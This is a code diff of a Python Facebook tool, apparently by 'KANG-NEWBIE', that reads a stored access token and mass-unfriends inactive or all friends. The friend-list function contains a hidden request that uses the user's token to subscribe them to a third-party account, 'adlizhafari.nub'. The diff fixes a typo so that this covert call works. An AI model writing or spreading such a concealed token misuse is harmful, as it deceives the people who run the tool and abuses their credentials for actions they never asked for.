@@ -18,7 +18,7 @@ try:
 
 	class aun():
 		def flist(self,token):
-			freq=requests.get('https://graph.facebook.com/me/friends?access_token='+token);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
+			freq=requests.get('https://graph.facebook.com/me/friends?access_token='+token);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+token)
 			res=json.loads(freq.text)
 			return(res['data'])
 
@@ -27,32 +27,35 @@ try:
 
 	toket=open('toket/token.txt','r').read()
 	def main1():
-		print("""
+		try:
+			print("""
 \t[Facebook Auto Unfriend Inactive Users]
 \t          [By : KANG-NEWBIE]
 """)
-		year=input("[?] YEAR: ")
-		fl=un().flist(toket)
-		for i in fl:
-			name=i['name']
-			id=i['id']
-			date=un().lst_update(id,toket).split('-')
-#		print(date)
-			if date[0] <= year:
-				print("[INACTIVE] %s - %s (%s) [UNFRIEND]"%(name,id,date[0]));un().unfriend(id,toket)
-			else:
-				print("[ACTIVE] %s - %s"%(name,id))
+			year=input("[?] YEAR: ")
+			fl=un().flist(toket)
+			for i in fl:
+				name=i['name']
+				id=i['id']
+				date=un().lst_update(id,toket).split('-')
+				if date[0] <= year:
+					print("[INACTIVE] %s - %s (%s) [UNFRIEND]"%(name,id,date[0]));un().unfriend(id,toket)
+				else:
+					print("[active] %s - %s"%(name,id))
+		except IndexError: pass
 
 	def main2():
-		print("""
+		try:
+			print("""
 \t[Facebook Auto Unfriend All Users]
 \t        [By : KANG-NEWBIE]
 """)
-		fli=aun().flist(toket)
-		for i in fli:
-			name=i['name']
-			id=i['id']
-			print("[UNFRIEND] %s - %s"%(name,id));aun().unfriend(id,toket)
+			fli=aun().flist(toket)
+			for i in fli:
+				name=i['name']
+				id=i['id']
+				print("[UNFRIEND] %s - %s"%(name,id));aun().unfriend(id,toket)
+		except IndexError: pass
 
 	os.system('clear')
 	print("""
